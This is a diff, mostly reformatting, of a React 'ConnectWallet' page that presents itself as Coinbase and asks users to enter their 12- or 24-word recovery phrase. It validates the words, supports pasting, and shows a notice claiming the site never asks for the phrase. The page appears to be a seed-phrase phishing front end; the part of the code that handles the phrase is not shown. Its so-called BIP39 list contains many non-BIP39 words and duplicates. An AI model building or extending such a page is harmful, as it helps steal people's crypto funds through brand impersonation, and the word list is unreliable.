@@ -1,29 +1,180 @@
 import { useState, useRef, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
-import { AlertCircle, Eye, EyeOff, ArrowLeft, CheckCircle2 } from "lucide-react";
+import {
+  AlertCircle,
+  Eye,
+  EyeOff,
+  ArrowLeft,
+  CheckCircle2,
+} from "lucide-react";
 
 // BIP39 word list (subset for demo - in production would be complete list)
 const BIP39_WORDS = new Set([
-  "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "abuse", "access",
-  "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act", "action",
-  "actor", "acts", "actuate", "acuity", "acute", "ad", "ada", "add", "adder", "adding", "addition",
-  "additional", "address", "adds", "adequate", "adieu", "adjust", "admin", "admit", "admix", "adobe",
-  "adopt", "adore", "adorn", "adown", "adrift", "adsorb", "adult", "advance", "adverse", "advert",
-  "advice", "advise", "advising", "advocate", "adze", "aeon", "aerated", "aerator", "aerie", "aero",
-  "aery", "afar", "affable", "affair", "affect", "affectation", "affected", "affection", "affiance",
-  "affiches", "affied", "affies", "affine", "affirm", "affix", "afflated", "afflatus", "afflict",
-  "affliction", "affluence", "affluent", "afford", "affray", "affrayed", "affreet", "affreight",
-  "affricate", "affront", "affusion", "affy", "afghani", "afghan", "afield", "afire", "aflame",
-  "afloat", "aflush", "afoot", "afore", "aforementioned", "aforesaid", "aforethought", "afoul",
-  "afraid", "afresh", "afrit", "after", "afterbirth", "afterburner", "aftercare", "aftercrop",
-  "afterdamp", "afterdeck", "aftereffect", "aftergame", "afterglow", "aftergrass", "afterguard",
-  "afterheat", "afterhours", "afterimage", "afterimpression", "afteringestion", "afterlife",
-  "afterlight", "afterload", "aftermath", "aftermost", "afternoon", "afterpain", "afterpart",
-  "afterpeak", "afterpiece", "afterrolls", "aftersales", "aftersea", "aftershaft", "aftershaves",
-  "aftershock", "aftershow", "aftertaste", "afterthought", "aftertime", "aftertimes", "aftertreatment",
-  "afterward", "afterwards", "afterword", "afterwort", "afoul", "afresh", "afrit", "aftmost",
-  "afts", "aft", "again", "against", "agape", "agaric", "agas", "agate", "agave", "agaze"
+  "abandon",
+  "ability",
+  "able",
+  "about",
+  "above",
+  "absent",
+  "absorb",
+  "abstract",
+  "abuse",
+  "access",
+  "accident",
+  "account",
+  "accuse",
+  "achieve",
+  "acid",
+  "acoustic",
+  "acquire",
+  "across",
+  "act",
+  "action",
+  "actor",
+  "acts",
+  "actuate",
+  "acuity",
+  "acute",
+  "ad",
+  "ada",
+  "add",
+  "adder",
+  "adding",
+  "addition",
+  "additional",
+  "address",
+  "adds",
+  "adequate",
+  "adieu",
+  "adjust",
+  "admin",
+  "admit",
+  "admix",
+  "adobe",
+  "adopt",
+  "adore",
+  "adorn",
+  "adown",
+  "adrift",
+  "adsorb",
+  "adult",
+  "advance",
+  "adverse",
+  "advert",
+  "advice",
+  "advise",
+  "advising",
+  "advocate",
+  "adze",
+  "aeon",
+  "aerated",
+  "aerator",
+  "aerie",
+  "aero",
+  "aery",
+  "afar",
+  "affable",
+  "affair",
+  "affect",
+  "affectation",
+  "affected",
+  "affection",
+  "affiance",
+  "affiches",
+  "affied",
+  "affies",
+  "affine",
+  "affirm",
+  "affix",
+  "afflated",
+  "afflatus",
+  "afflict",
+  "affliction",
+  "affluence",
+  "affluent",
+  "afford",
+  "affray",
+  "affrayed",
+  "affreet",
+  "affreight",
+  "affricate",
+  "affront",
+  "affusion",
+  "affy",
+  "afghani",
+  "afghan",
+  "afield",
+  "afire",
+  "aflame",
+  "afloat",
+  "aflush",
+  "afoot",
+  "afore",
+  "aforementioned",
+  "aforesaid",
+  "aforethought",
+  "afoul",
+  "afraid",
+  "afresh",
+  "afrit",
+  "after",
+  "afterbirth",
+  "afterburner",
+  "aftercare",
+  "aftercrop",
+  "afterdamp",
+  "afterdeck",
+  "aftereffect",
+  "aftergame",
+  "afterglow",
+  "aftergrass",
+  "afterguard",
+  "afterheat",
+  "afterhours",
+  "afterimage",
+  "afterimpression",
+  "afteringestion",
+  "afterlife",
+  "afterlight",
+  "afterload",
+  "aftermath",
+  "aftermost",
+  "afternoon",
+  "afterpain",
+  "afterpart",
+  "afterpeak",
+  "afterpiece",
+  "afterrolls",
+  "aftersales",
+  "aftersea",
+  "aftershaft",
+  "aftershaves",
+  "aftershock",
+  "aftershow",
+  "aftertaste",
+  "afterthought",
+  "aftertime",
+  "aftertimes",
+  "aftertreatment",
+  "afterward",
+  "afterwards",
+  "afterword",
+  "afterwort",
+  "afoul",
+  "afresh",
+  "afrit",
+  "aftmost",
+  "afts",
+  "aft",
+  "again",
+  "against",
+  "agape",
+  "agaric",
+  "agas",
+  "agate",
+  "agave",
+  "agaze",
 ]);
 
 const isValidWord = (word: string): boolean => {
@@ -35,7 +186,9 @@ export default function ConnectWallet() {
   const [wordCount, setWordCount] = useState(12);
   const [words, setWords] = useState<string[]>(Array(12).fill(""));
   const [showWords, setShowWords] = useState(false);
-  const [validations, setValidations] = useState<boolean[]>(Array(12).fill(false));
+  const [validations, setValidations] = useState<boolean[]>(
+    Array(12).fill(false),
+  );
   const [isLoading, setIsLoading] = useState(false);
   const [error, setError] = useState("");
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
@@ -43,7 +196,7 @@ export default function ConnectWallet() {
   const handleWordChange = (index: number, value: string) => {
     const newWords = [...words];
     const cleanValue = value.replace(/\s+/g, " ").trim();
-    
+
     if (cleanValue.includes(" ")) {
       // Paste functionality - split and fill fields
       const pastedWords = cleanValue.split(/\s+/).slice(0, wordCount - index);
@@ -62,7 +215,7 @@ export default function ConnectWallet() {
     } else {
       newWords[index] = value.toLowerCase();
       setWords(newWords);
-      
+
       // Auto-advance if word is valid and complete
       if (value && isValidWord(value) && index < wordCount - 1) {
         setTimeout(() => {
@@ -70,9 +223,9 @@ export default function ConnectWallet() {
         }, 0);
       }
     }
-    
+
     // Validate
-    const newValidations = newWords.map(w => isValidWord(w) || w === "");
+    const newValidations = newWords.map((w) => isValidWord(w) || w === "");
     setValidations(newValidations);
     setError("");
   };
@@ -86,8 +239,8 @@ export default function ConnectWallet() {
 
   const handleConnect = async () => {
     // Validate all words are filled and valid
-    const allFilled = words.every(w => w.length > 0);
-    const allValid = words.every(w => isValidWord(w));
+    const allFilled = words.every((w) => w.length > 0);
+    const allValid = words.every((w) => isValidWord(w));
 
     if (!allFilled) {
       setError("Please enter all words");
@@ -128,9 +281,12 @@ export default function ConnectWallet() {
       <div className="max-w-4xl mx-auto px-4 py-12">
         {/* Title */}
         <div className="text-center mb-12">
-          <h1 className="text-4xl font-bold text-gray-900 mb-4">Connect Your Coinbase Wallet</h1>
+          <h1 className="text-4xl font-bold text-gray-900 mb-4">
+            Connect Your Coinbase Wallet
+          </h1>
           <p className="text-xl text-gray-600 max-w-2xl mx-auto">
-            Enter your {wordCount}-word recovery phrase to securely access your wallet
+            Enter your {wordCount}-word recovery phrase to securely access your
+            wallet
           </p>
         </div>
 
@@ -138,9 +294,12 @@ export default function ConnectWallet() {
         <div className="bg-yellow-50 border-l-4 border-yellow-500 p-4 rounded mb-8 flex gap-3">
           <AlertCircle className="text-yellow-600 flex-shrink-0" size={24} />
           <div>
-            <h3 className="font-semibold text-yellow-900 mb-1">Keep Your Seed Phrase Safe</h3>
+            <h3 className="font-semibold text-yellow-900 mb-1">
+              Keep Your Seed Phrase Safe
+            </h3>
             <p className="text-yellow-800 text-sm">
-              Never share your seed phrase with anyone. We will never ask for it and it's never stored on our servers.
+              Never share your seed phrase with anyone. We will never ask for it
+              and it's never stored on our servers.
             </p>
           </div>
         </div>
@@ -193,7 +352,9 @@ export default function ConnectWallet() {
             </button>
           </div>
 
-          <div className={`grid gap-3 ${wordCount === 12 ? "grid-cols-4" : "grid-cols-6"}`}>
+          <div
+            className={`grid gap-3 ${wordCount === 12 ? "grid-cols-4" : "grid-cols-6"}`}
+          >
             {words.map((word, index) => (
               <div key={index} className="relative">
                 <label className="block text-xs text-gray-500 mb-1 font-medium">
@@ -215,8 +376,8 @@ export default function ConnectWallet() {
                         word === ""
                           ? "hsl(220 13% 91%)"
                           : isValidWord(word)
-                          ? "#10b981"
-                          : "#ef4444",
+                            ? "#10b981"
+                            : "#ef4444",
                     }}
                   />
                   {word && (
@@ -236,7 +397,7 @@ export default function ConnectWallet() {
           {/* Counter */}
           <div className="mt-4 text-sm text-gray-600">
             <span className="font-medium">
-              {words.filter(w => w.length > 0).length}
+              {words.filter((w) => w.length > 0).length}
             </span>
             {" of "}
             <span className="font-medium">{wordCount}</span>
@@ -256,7 +417,7 @@ export default function ConnectWallet() {
         <div className="flex gap-4">
           <Button
             onClick={handleConnect}
-            disabled={!words.every(w => isValidWord(w) || w === "")}
+            disabled={!words.every((w) => isValidWord(w) || w === "")}
             className="flex-1 bg-blue-600 hover:bg-blue-700 disabled:bg-gray-300 disabled:cursor-not-allowed text-white font-medium py-3 rounded-lg transition"
           >
             {isLoading ? "Connecting..." : "Connect Wallet"}
